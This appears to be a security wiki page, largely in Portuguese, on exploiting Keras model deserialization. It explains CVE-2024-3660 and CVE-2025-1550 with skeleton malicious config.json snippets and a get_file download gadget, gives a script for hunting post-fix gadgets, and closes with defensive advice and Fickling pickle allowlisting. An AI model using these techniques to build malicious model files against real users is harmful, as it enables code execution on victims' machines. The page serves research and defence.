# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas práticas de exploração contra o pipeline de desserialização de modelos Keras, explica a estrutura interna nativa do formato .keras e a superfície de ataque, e fornece um kit de ferramentas para pesquisadores encontrarem Model File Vulnerabilities (MFVs) e post-fix gadgets.

## Estrutura interna do formato .keras

A .keras file é um arquivo ZIP contendo pelo menos:
- metadata.json – informações genéricas (ex.: versão do Keras)
- config.json – arquitetura do modelo (superfície de ataque primária)
- model.weights.h5 – pesos em HDF5

O config.json conduz a desserialização recursiva: Keras importa módulos, resolve classes/funções e reconstrói camadas/objetos a partir de dicionários controlados pelo atacante.

Exemplo de trecho para um objeto de camada Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Importação de módulos e resolução de símbolos a partir das chaves module/class_name
- from_config(...) ou invocação de construtor com kwargs controlados pelo atacante
- Recursão em objetos aninhados (activations, initializers, constraints, etc.)

Historically, this exposed three primitives to an attacker crafting config.json:
- Controle sobre quais módulos são importados
- Controle sobre quais classes/functions são resolvidas
- Controle dos kwargs passados para construtores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigação:
- O Keras aplica safe_mode=True por padrão. Funções Python serializadas em Lambda são bloqueadas a menos que o usuário explicitamente opte por desativar com safe_mode=False.

Notas:
- Formatos legados (HDF5 saves mais antigos) ou codebases mais antigas podem não aplicar as checagens modernas, então ataques do tipo “downgrade” ainda podem ser aplicáveis quando as vítimas usam loaders mais antigos.

## CVE-2025-1550 – Importação arbitrária de módulo no Keras ≤ 3.8

Causa raiz:
- _retrieve_class_or_fn usava importlib.import_module() sem restrições com strings de módulo controladas pelo atacante vindas de config.json.
- Impacto: importação arbitrária de qualquer módulo instalado (ou módulo plantado pelo atacante em sys.path). Código em tempo de importação é executado, então a construção do objeto ocorre com kwargs controlados pelo atacante.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Melhorias de segurança (Keras ≥ 3.9):
- Module allowlist: imports restritos aos módulos do ecossistema oficial: keras, keras_hub, keras_cv, keras_nlp
- Safe mode padrão: safe_mode=True bloqueia o carregamento de funções Lambda serializadas inseguras
- Verificação básica de tipos: objetos desserializados devem corresponder aos tipos esperados

## Superfície de gadgets pós-fix dentro da allowlist

Mesmo com allowlisting e safe mode, uma superfície ampla permanece entre os callables do Keras permitidos. Por exemplo, keras.utils.get_file pode baixar URLs arbitrários para locais selecionáveis pelo usuário.

Gadget via Lambda que referencia uma função permitida (não bytecode Python serializado):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() prefixa o tensor de entrada como o primeiro argumento posicional ao invocar o callable alvo. Os gadgets escolhidos devem tolerar um argumento posicional extra (ou aceitar *args/**kwargs). Isso restringe quais funções são viáveis.

Potential impacts of allowlisted gadgets:
- Download/escrita arbitrária (path planting, config poisoning)
- Callbacks de rede/efeitos SSRF-like dependendo do ambiente
- Encadeamento para execução de código se caminhos gravados forem posteriormente importados/executados ou adicionados ao PYTHONPATH, ou se existir um local gravável que execute ao ser escrito

## Researcher toolkit

1) Systematic gadget discovery in allowed modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Teste direto de deserialization (sem .keras archive necessário)

Alimente dicts criados diretamente nos Keras deserializers para aprender os params aceitos e observar side effects.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondagem entre versões e formatos

Keras existe em múltiplas bases de código/eras com diferentes proteções e formatos:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Repita os testes através das bases de código e formatos (.keras vs legacy HDF5) para descobrir regressões ou proteções ausentes.

## Recomendações defensivas

- Trate arquivos de modelo como entrada não confiável. Carregue modelos apenas de fontes confiáveis.
- Mantenha o Keras atualizado; use Keras ≥ 3.9 para beneficiar-se de allowlisting e verificações de tipo.
- Não defina safe_mode=False ao carregar modelos, a menos que você confie totalmente no arquivo.
- Considere executar a desserialização em um ambiente sandboxado com privilégios mínimos, sem egressos de rede e com acesso ao sistema de arquivos restrito.
- Aplique allowlists/assinaturas para fontes de modelos e verificação de integridade sempre que possível.

## ML pickle import allowlisting for AI/ML models (Fickling)

Muitos formatos de modelos AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artefatos TensorFlow mais antigos, etc.) incorporam dados pickle do Python. Atacantes rotineiramente abusam de importações GLOBAL do pickle e de construtores de objetos para obter RCE ou troca de modelo durante o carregamento. Scanners baseados em blacklist frequentemente deixam passar imports perigosos novos ou não listados.

Uma defesa prática em modo fail-closed é interceptar o desserializador pickle do Python e permitir apenas um conjunto revisado de imports relacionados a ML durante o unpickling. Trail of Bits’ Fickling implementa essa política e fornece uma allowlist curada de imports ML construída a partir de milhares de pickles públicos do Hugging Face.

Modelo de segurança para imports “seguros” (intuições destiladas de pesquisa e prática): símbolos importados usados por um pickle devem simultaneamente:
- Não executar código nem causar execução (sem objetos de código compilado/fonte, chamadas ao shell, hooks, etc.)
- Não obter/definir atributos ou itens arbitrários
- Não importar ou obter referências a outros objetos Python do pickle VM
- Não disparar quaisquer desserializadores secundários (ex.: marshal, pickle aninhado), mesmo indiretamente

Habilite as proteções do Fickling o mais cedo possível na inicialização do processo para que quaisquer carregamentos de pickle realizados por frameworks (torch.load, joblib.load, etc.) sejam verificados:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Dicas operacionais:
- Você pode desativar/reabilitar temporariamente os hooks onde necessário:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se um modelo conhecido e confiável for bloqueado, estenda a allowlist para o seu ambiente após revisar os símbolos:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling também expõe guardas de runtime genéricos se você preferir controle mais granular:
- fickling.always_check_safety() para aplicar verificações em todos os pickle.load()
- with fickling.check_safety(): para aplicação com escopo
- fickling.load(path) / fickling.is_likely_safe(path) para verificações pontuais

- Prefira formatos de modelo não-baseados em pickle quando possível (por exemplo, SafeTensors). Se precisar aceitar pickle, execute os carregadores com o mínimo de privilégios, sem saída de rede, e aplique a allowlist.

Essa estratégia baseada em allowlist bloqueia demonstravelmente caminhos comuns de exploração de pickle em ML enquanto mantém alta compatibilidade. No benchmark da ToB, Fickling sinalizou 100% dos arquivos sintéticos maliciosos e permitiu ~99% dos arquivos limpos de repositórios populares do Hugging Face.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
